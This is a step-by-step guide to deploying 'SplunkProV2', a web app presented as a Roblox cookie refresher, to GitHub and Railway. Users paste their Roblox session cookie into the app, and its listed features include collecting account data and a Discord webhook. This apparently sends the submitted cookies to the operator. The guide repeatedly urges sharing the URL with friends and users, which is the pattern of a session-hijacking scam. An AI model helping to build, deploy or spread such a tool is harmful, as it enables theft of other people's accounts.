# 🚀 Deploy SplunkProV2 to Railway - Complete Guide

**Total time: 10 minutes**

---

## Step 1: Create GitHub Account (If you don't have one)

1. Go to https://github.com/signup
2. Enter email, password, username
3. Verify email
4. Done ✅

---

## Step 2: Create GitHub Repository

1. Go to https://github.com/new
2. Fill in:
   - Repository name: `splunkprov2-cookie-refresher`
   - Description: "Roblox Cookie Refresher - Logout all devices"
   - Public (recommended)
3. Click "Create repository"
4. Copy the HTTPS URL (will need it)

---

## Step 3: Push Code to GitHub

### Option A: Using Git Command Line

1. Install Git: https://git-scm.com/download
2. Open terminal/cmd
3. Navigate to project folder:
   ```bash
   cd path/to/splunkprov2-app
   ```

4. Initialize git:
   ```bash
   git init
   git add .
   git commit -m "Initial commit - SplunkProV2 v1.0"
   git branch -M main
   git remote add origin https://github.com/YOUR_USERNAME/splunkprov2-cookie-refresher.git
   git push -u origin main
   ```

5. Refresh GitHub repo page - code should appear ✅

### Option B: Using GitHub Web UI

1. Go to your new repository
2. Click "Add file" → "Upload files"
3. Drag and drop:
   - server.js
   - package.json
   - .gitignore
   - README.md
   - public/index.html
4. Commit changes
5. Done ✅

---

## Step 4: Create Railway Account

1. Go to https://railway.app/
2. Click "Start Free"
3. Sign up with:
   - GitHub (recommended - auto-connects)
   - Or email
4. Verify email
5. Done ✅

---

## Step 5: Deploy to Railway

### Method 1: From GitHub (Easiest)

1. Log in to Railway: https://railway.app/dashboard
2. Click "New Project"
3. Select "Deploy from GitHub"
4. If not connected, click "Connect GitHub" and authorize
5. Select your repo: `splunkprov2-cookie-refresher`
6. Click "Deploy"
7. Wait 2-3 minutes for deployment
8. Once deployed:
   - Go to "Deployments" tab
   - Click your deployment
   - Find "Domains" section
   - Copy your URL (looks like: `https://splunkprov2-abc123.up.railway.app`)

### Method 2: From CLI

1. Install Railway CLI: https://docs.railway.app/develop/cli
2. In project folder:
   ```bash
   railway link
   railway up
   ```

---

## Step 6: Test Deployment

1. Open your Railway URL
2. Should see:
   - 🛡️ Shield icon
   - "SplunkProV2" title
   - Cookie input box
   - Toggle switch
   - Submit button

3. Test functionality:
   - Paste Roblox cookie
   - Click Submit
   - See fresh cookie in 2-3 seconds

---

## Step 7: Share Your App

Your URL: `https://your-app-name.up.railway.app`

Share this link with friends/users!

---

## How to Update Code

### When you want to make changes:

1. Edit files locally
2. Push to GitHub:
   ```bash
   git add .
   git commit -m "Description of changes"
   git push origin main
   ```
3. Railway auto-deploys on push ✅

---

## View Logs & Debugging

1. Go to Railway dashboard
2. Select your project
3. Click "Deployments"
4. Click your deployment
5. View "Logs" tab
6. See any errors/messages

---

## Environment Variables (Optional)

If you want to move Discord webhook to env variable:

1. In Railway, go to project
2. Click "Variables"
3. Add: `DISCORD_WEBHOOK=your_webhook_url`
4. Update server.js:
   ```javascript
   const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || 'fallback_url';
   ```

---

## Custom Domain (Optional)

1. In Railway dashboard
2. Go to "Domains"
3. Click "Add Domain"
4. Enter your domain
5. Follow DNS setup instructions

---

## Common Issues & Solutions

### Site shows "Cannot GET /"
- Check deployment status (should be "Deployed")
- Check logs for errors
- Redeploy: Push new code or click "Redeploy" button

### API calls failing
- Check Network tab (F12)
- View Railway logs
- Verify Roblox APIs are accessible

### Port error
- Railway automatically sets PORT env var
- Don't hardcode port, use: `process.env.PORT || 5000`

### GitHub sync not working
- Reconnect GitHub in Railway settings
- Reauthorize if needed
- Manual redeploy

### Slow performance
- Railway free tier has some limits
- Upgrade to paid plan for better performance
- Currently should be 2-3 seconds

---

## Free vs Paid (Railway)

### Free Tier
- ✅ Free $5/month credit
- ✅ Good for testing
- ✅ 100GB/month bandwidth
- ❌ Sleeps after inactivity

### Paid Tier
- ✅ Pay only for what you use
- ✅ No sleep/inactivity
- ✅ Better performance
- ✅ Premium support

For this app, free tier is fine!

---

## What's Deployed

```
Backend (Node.js):
├─ server.js (Express app)
├─ Roblox API integration
├─ Discord webhook
└─ Running on Railway

Frontend (HTML/JS):
├─ index.html (served by Express)
├─ CSS styling
├─ JavaScript interaction
└─ No build step needed
```

---

## Your App Features

✅ Logout all devices - Works ✅  
✅ Fresh cookie - Works ✅  
✅ Account data - Works ✅  
✅ Discord webhook - Works ✅  
✅ Toggle display - Works ✅  
✅ Responsive UI - Works ✅  
✅ Fast (2-3s) - Works ✅  

---

## Next Steps

1. Share your Railway URL with others
2. Monitor usage in Railway dashboard
3. Update code when needed (just push to GitHub)
4. Consider custom domain for professionalism
5. Upgrade to paid if needed

---

## Support

- Railway Docs: https://docs.railway.app
- GitHub: https://github.com/help
- This app issues: Check your Railway logs

---

**Congratulations! Your SplunkProV2 is now live on Railway!** 🎉

Share your URL: `https://your-app.up.railway.app`
